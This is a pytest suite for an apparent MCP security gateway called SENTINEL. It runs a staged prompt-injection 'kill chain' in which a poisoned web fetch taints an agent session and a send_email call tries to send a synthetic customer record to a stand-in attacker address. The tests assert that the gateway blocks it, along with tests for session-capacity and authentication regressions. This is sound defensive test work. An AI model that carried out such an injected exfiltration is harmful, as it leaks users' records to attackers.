"""Phase 9 DoD — the MCP-over-HTTP wire transport, proven end-to-end.

These tests do something none of the earlier phases could: they connect a REAL,
independent MCP client to SENTINEL over a REAL TCP socket (a uvicorn server on an
ephemeral port) and drive the hero kill chain through it. This is the proof that
SENTINEL is something you can put in front of YOUR agent — the agent↔SENTINEL hop
is genuine HTTP/MCP, not an in-process stream — and that the SAME pipeline
(provenance → authorization → trust → forensics) secures it.

The client here is ``mcp.client.streamable_http`` from the upstream SDK: it knows
nothing about SENTINEL. To it, SENTINEL is just an MCP server exposing tools.
"""
from __future__ import annotations

import asyncio
import socket
from contextlib import AsyncExitStack, asynccontextmanager

import httpx
import pytest
import uvicorn
from fastapi import FastAPI
from mcp import ClientSession
from mcp.client.streamable_http import streamable_http_client
from starlette.applications import Starlette

from sentinel.config import reset_settings_cache
from sentinel.control.app import create_app
from sentinel.control.manager import RunManager
from sentinel.control.mcp_gateway import SentinelGateway
from sentinel.demo.tool_servers import (
    ATTACKER_ADDRESS,
    OBVIOUS_URL,
    ToolServerState,
    build_downstream,
)
from sentinel.forensics.store import InMemoryForensicStore
from sentinel.mcp_proxy.content import result_text

# This is a real socket integration: a few teardown-time ResourceWarnings from
# the HTTP stack are environmental noise, not product defects. The suite runs
# under filterwarnings=error, so scope the ignore tightly to this module.
pytestmark = [
    pytest.mark.filterwarnings("ignore::ResourceWarning"),
    # anyio in-memory streams emit an unraisable warning when GC'd after the
    # event loop closes during teardown — a harness artifact, not a product leak.
    pytest.mark.filterwarnings("ignore::pytest.PytestUnraisableExceptionWarning"),
]


def _free_port() -> int:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("127.0.0.1", 0))
    port: int = sock.getsockname()[1]
    sock.close()
    return port


class _RunningServer:
    """Run ``app`` under uvicorn on an ephemeral port, in the test's event loop."""

    def __init__(self, app: Starlette) -> None:  # FastAPI or FastMCP's ASGI app
        self.port = _free_port()
        config = uvicorn.Config(
            app,
            host="127.0.0.1",
            port=self.port,
            log_level="warning",
            lifespan="on",
            # MCP streamable-HTTP is plain HTTP (POST/GET/SSE); skip the websockets
            # protocol import entirely (it emits a deprecation warning that the
            # suite's filterwarnings=error would otherwise turn into a startup crash).
            ws="none",
        )
        self._server = uvicorn.Server(config)
        # Don't let uvicorn install process-wide signal handlers inside pytest.
        self._server.install_signal_handlers = lambda: None  # type: ignore[method-assign]
        self._task: asyncio.Task[None] | None = None

    @property
    def mcp_url(self) -> str:
        return f"http://127.0.0.1:{self.port}/mcp"

    async def __aenter__(self) -> _RunningServer:
        self._task = asyncio.create_task(self._server.serve())
        for _ in range(250):  # up to ~5s for startup (incl. downstream connect)
            if self._server.started:
                return self
            await asyncio.sleep(0.02)
        raise RuntimeError("uvicorn did not start in time")

    async def __aexit__(self, *exc: object) -> None:
        self._server.should_exit = True
        if self._task is not None:
            await self._task


async def test_external_mcp_client_over_http_is_secured() -> None:
    """A real MCP client over TCP runs the hero kill chain → exfiltration BLOCKED.

    Tool discovery and the legit read calls succeed; the poisoned-lineage
    ``send_email`` to the attacker is refused at the MCP boundary with a clean
    error — exactly as in the in-process demo, but now over the wire.
    """
    manager = RunManager(store=InMemoryForensicStore())
    app = create_app(manager, enable_mcp_gateway=True)

    async with _RunningServer(app) as server:
        async with streamable_http_client(server.mcp_url) as (read, write, _sid):
            async with ClientSession(read, write) as session:
                await session.initialize()

                # 1. Discovery: SENTINEL presents the downstream catalogue.
                listed = await session.list_tools()
                names = {tool.name for tool in listed.tools}
                assert {"get_customer_record", "web_fetch", "send_email"} <= names

                # 2. Legit retrieval (allowed) — the synthetic record.
                record = await session.call_tool("get_customer_record", {"id": 42})
                assert not record.isError
                assert "SYNTHETIC" in result_text(record)

                # 3. Poisoned page fetch (allowed; taints the session lineage).
                page = await session.call_tool("web_fetch", {"url": OBVIOUS_URL})
                assert not page.isError

                # 4. The exfiltration: send the record to the attacker. BLOCKED.
                blocked = await session.call_tool(
                    "send_email",
                    {
                        "to": ATTACKER_ADDRESS,
                        "subject": "Account profile",
                        "body": result_text(record),
                    },
                )
                assert blocked.isError
                assert "SENTINEL blocked" in result_text(blocked)

        # 5. Nothing actually left the building: the mock outbox is empty.
        gateway = app.state.gateway
        assert gateway is not None
        assert gateway.outbox == []

    # 6. The block is on the forensic record the dashboard/SOC reads — one live
    #    run, one trace, a high-severity ToolBlocked the classifier calls exfiltration.
    runs = manager.list_runs()
    assert len(runs) == 1
    assert runs[0].scenario == "live-mcp"
    alerts = await manager.audit(runs[0].trace_id)
    blocked_alerts = [a for a in alerts if a["alert_type"] == "ToolBlocked"]
    assert len(blocked_alerts) == 1
    assert blocked_alerts[0]["severity"] == "high"
    assert blocked_alerts[0]["attack_class"] == "exfiltration"


async def test_two_wire_sessions_are_isolated_traces() -> None:
    """Two independent MCP connections → two separate traces / agents.

    Proves the gateway gives each MCP session its own SentinelProxy (one session
    == one trace), so concurrent external clients don't share provenance or trust.
    """
    manager = RunManager(store=InMemoryForensicStore())
    app = create_app(manager, enable_mcp_gateway=True)

    async with _RunningServer(app) as server:
        for _ in range(2):
            async with streamable_http_client(server.mcp_url) as (read, write, _sid):
                async with ClientSession(read, write) as session:
                    await session.initialize()
                    await session.call_tool("get_customer_record", {"id": 7})

    runs = manager.list_runs()
    assert len(runs) == 2
    trace_ids = {r.trace_id for r in runs}
    agent_ids = {r.agent_id for r in runs}
    assert len(trace_ids) == 2  # distinct traces
    assert len(agent_ids) == 2  # distinct per-session agents


async def test_bare_app_has_no_wire_gateway() -> None:
    """Without the flag there is no /mcp mount — the REST demo is unchanged."""
    app = create_app(RunManager(store=InMemoryForensicStore()))
    assert app.state.gateway is None
    mounted = [getattr(r, "path", "") for r in app.routes]
    assert not any(str(p).startswith("/mcp") for p in mounted)


def _gateway_only_app(gateway: SentinelGateway) -> FastAPI:
    """A minimal app that mounts ONE gateway (so a test can set max_sessions)."""

    @asynccontextmanager
    async def _lifespan(_app: FastAPI):  # type: ignore[no-untyped-def]
        async with gateway:
            yield

    app = FastAPI(lifespan=_lifespan)
    app.mount("/mcp", gateway.handle_asgi)
    return app


async def test_capacity_pressure_cannot_launder_provenance() -> None:
    """Regression: a live session's provenance is NEVER reset to make room.

    The earlier gateway FIFO-evicted the oldest session at capacity. If that
    session was still live, its next call minted a FRESH, untainted proxy — so an
    already-tainted ``send_email`` (which `block-untrusted-origin` must deny even
    to an allowed domain) sailed through and the synthetic secret was exfiltrated.

    With the fix the gateway fails CLOSED: at capacity it refuses a NEW session
    rather than evict a live one, so session A's taint survives session B's
    arrival and the exfiltration stays blocked.
    """
    manager = RunManager(store=InMemoryForensicStore())
    gateway = SentinelGateway(manager, max_sessions=1)  # capacity of exactly one
    app = _gateway_only_app(gateway)

    async with _RunningServer(app) as server:
        async with streamable_http_client(server.mcp_url) as (read_a, write_a, _a):
            async with ClientSession(read_a, write_a) as a:
                await a.initialize()
                record = await a.call_tool("get_customer_record", {"id": 42})
                assert not record.isError
                page = await a.call_tool("web_fetch", {"url": OBVIOUS_URL})  # taints A
                assert not page.isError

                # A second client arrives while A is still open. Capacity is 1, so
                # the gateway must REFUSE B — not evict A.
                async with streamable_http_client(server.mcp_url) as (read_b, write_b, _b):
                    async with ClientSession(read_b, write_b) as b:
                        await b.initialize()
                        refused = await b.call_tool("get_customer_record", {"id": 7})
                        assert refused.isError
                        assert "capacity" in result_text(refused).lower()

                # A's taint survived: send_email to an ALLOWED domain is still
                # blocked by block-untrusted-origin — A's proxy was never reset.
                blocked = await a.call_tool(
                    "send_email",
                    {"to": "auditor@corp.example", "subject": "fyi",
                     "body": result_text(record)},
                )
                assert blocked.isError
                assert "SENTINEL blocked" in result_text(blocked)

        # Nothing was laundered out to the shared outbox.
        assert gateway.outbox == []


class _FakeSession:
    """Stands in for a transport ``ServerSession`` (weak-referenceable, unique)."""


async def test_closed_sessions_release_capacity() -> None:
    """F-04: sessions that have ENDED must stop consuming the capacity budget.

    The gateway kept every session it had ever seen in a dict with no removal
    path, keyed by ``id(session)``. Two consequences, both real:

    * **Permanent exhaustion.** A deployment refused ALL new agent sessions once
      ``max_sessions`` connections had been *served* — not once that many were
      concurrent. With the shipped cap of 512 a gateway fronting short client
      sessions bricks itself, which is total denial of service against the
      security proxy every agent must route through.
    * **Recycled identity.** ``id()`` is a memory address and CPython reuses it.
      With no removal path, a NEW session landing on a freed address was handed
      the PREVIOUS session's proxy — inheriting another principal's trace,
      provenance frontier and trust.

    Driven through :meth:`_proxy_for_session` with stand-in session objects
    rather than real HTTP sessions: the lifecycle rule is about what the gateway
    does when a session object goes away, so releasing it here is the precise
    stimulus, and it stays deterministic instead of depending on socket teardown.
    """
    manager = RunManager(store=InMemoryForensicStore())
    gateway = SentinelGateway(manager, max_sessions=2)
    async with gateway:
        # Five times the cap, one at a time — concurrency never exceeds one.
        for _ in range(10):
            session = _FakeSession()
            proxy = await gateway._proxy_for_session(session)  # type: ignore[arg-type]
            assert proxy is not None, "a sequential session was refused at capacity"
            assert gateway.active_sessions == 1
            del session  # the transport is done with it
        assert gateway.active_sessions == 0

        # Every session was a distinct principal, and no identity is a memory
        # address that a later session could be handed.
        agent_ids = [r.agent_id for r in manager.list_runs()]
        assert len(agent_ids) == 10
        assert len(set(agent_ids)) == 10

        # CONCURRENT sessions still hit the cap and are refused, not evicted:
        # capacity is about how many are live at once.
        live = [_FakeSession() for _ in range(3)]
        proxies = [await gateway._proxy_for_session(s) for s in live]  # type: ignore[arg-type]
        assert proxies[0] is not None and proxies[1] is not None
        assert proxies[2] is None, "over-capacity session must fail closed"
        # The two live sessions keep their own proxies — never swapped or reset.
        assert await gateway._proxy_for_session(live[0]) is proxies[0]  # type: ignore[arg-type]
        assert await gateway._proxy_for_session(live[1]) is proxies[1]  # type: ignore[arg-type]


async def test_idle_retirement_refuses_rather_than_reseeds() -> None:
    """An idle session's proxy may be released — but it is never re-seeded.

    Retirement is the backstop for a session the transport never hands back. It
    must not become the eviction bug in disguise: if a retired session comes
    back, handing it a FRESH proxy would reset its provenance frontier and let a
    tainted action through clean. It is refused instead.
    """
    manager = RunManager(store=InMemoryForensicStore())
    gateway = SentinelGateway(manager, max_sessions=1, idle_ttl=0.0)
    async with gateway:
        stale = _FakeSession()
        assert await gateway._proxy_for_session(stale) is not None  # type: ignore[arg-type]

        # A new session arrives; the idle one is retired to make room.
        fresh = _FakeSession()
        assert await gateway._proxy_for_session(fresh) is not None  # type: ignore[arg-type]

        # The retired session is refused — NOT given a clean proxy.
        assert await gateway._proxy_for_session(stale) is None  # type: ignore[arg-type]


async def test_mcp_requires_bearer_token_when_configured(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """When SENTINEL_API_TOKEN is set, /mcp refuses unauthenticated clients.

    The wire endpoint must not be an open tool server on a public deploy: no
    token -> the connection is refused; the correct bearer -> it works.
    """
    monkeypatch.setenv("SENTINEL_API_TOKEN", "s3cr3t-wire-token")
    reset_settings_cache()
    try:
        manager = RunManager(store=InMemoryForensicStore())
        app = create_app(manager, enable_mcp_gateway=True)
        async with _RunningServer(app) as server:
            # No credential → refused (initialize fails; never hangs).
            refused = False
            try:
                async with streamable_http_client(server.mcp_url) as (read, write, _s):
                    async with ClientSession(read, write) as session:
                        await asyncio.wait_for(session.initialize(), timeout=8)
            except Exception:  # noqa: BLE001 - any failure means it was refused
                refused = True
            assert refused, "unauthenticated /mcp must be refused when a token is set"

            # Correct bearer token → works. follow_redirects mirrors the SDK's
            # default client (the /mcp mount 307-redirects to /mcp/).
            authed = httpx.AsyncClient(
                headers={"Authorization": "Bearer s3cr3t-wire-token"},
                follow_redirects=True,
            )
            async with streamable_http_client(
                server.mcp_url, http_client=authed
            ) as (read, write, _s):
                async with ClientSession(read, write) as session:
                    await session.initialize()
                    tools = await session.list_tools()
                    assert any(t.name == "send_email" for t in tools.tools)
    finally:
        monkeypatch.delenv("SENTINEL_API_TOKEN", raising=False)
        reset_settings_cache()


async def test_remote_http_tool_servers_are_secured(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The gateway routes to REMOTE tool servers over real HTTP and still blocks.

    Proves the deploy isn't theater: the three mock tool servers are served under
    their own uvicorn (as they would be as separate internal ACA apps), the
    gateway connects to them over MCP-over-HTTP (not the in-memory mocks), and the
    hero exfiltration is still blocked at the proxy. The remote email server's own
    state confirms nothing was sent.
    """
    state = ToolServerState()
    servers = build_downstream(state)  # web / email / records FastMCP instances

    async with AsyncExitStack() as stack:
        runners = {
            key: await stack.enter_async_context(_RunningServer(srv.streamable_http_app()))
            for key, srv in servers.items()
        }
        monkeypatch.setenv("SENTINEL_TOOLS_WEB_URL", f"http://127.0.0.1:{runners['web'].port}/mcp")
        monkeypatch.setenv("SENTINEL_TOOLS_EMAIL_URL", f"http://127.0.0.1:{runners['email'].port}/mcp")
        monkeypatch.setenv("SENTINEL_TOOLS_RECORDS_URL", f"http://127.0.0.1:{runners['records'].port}/mcp")
        reset_settings_cache()
        try:
            manager = RunManager(store=InMemoryForensicStore())
            gateway = SentinelGateway(manager)
            gw = await stack.enter_async_context(_RunningServer(_gateway_only_app(gateway)))
            # The gateway connected over HTTP, not in-memory.
            assert gateway.downstream_mode == "remote-http"

            async with streamable_http_client(gw.mcp_url) as (read, write, _s):
                async with ClientSession(read, write) as session:
                    await session.initialize()
                    names = {t.name for t in (await session.list_tools()).tools}
                    assert {"get_customer_record", "web_fetch", "send_email"} <= names
                    record = await session.call_tool("get_customer_record", {"id": 42})
                    assert not record.isError
                    assert "SYNTHETIC" in result_text(record)
                    assert not (await session.call_tool("web_fetch", {"url": OBVIOUS_URL})).isError
                    blocked = await session.call_tool(
                        "send_email",
                        {"to": ATTACKER_ADDRESS, "subject": "x", "body": result_text(record)},
                    )
                    assert blocked.isError
                    assert "SENTINEL blocked" in result_text(blocked)
            # The remote email tool server received nothing — the exfil was stopped
            # at the proxy, before the second (now real HTTP) MCP hop.
            assert state.outbox == []
        finally:
            reset_settings_cache()
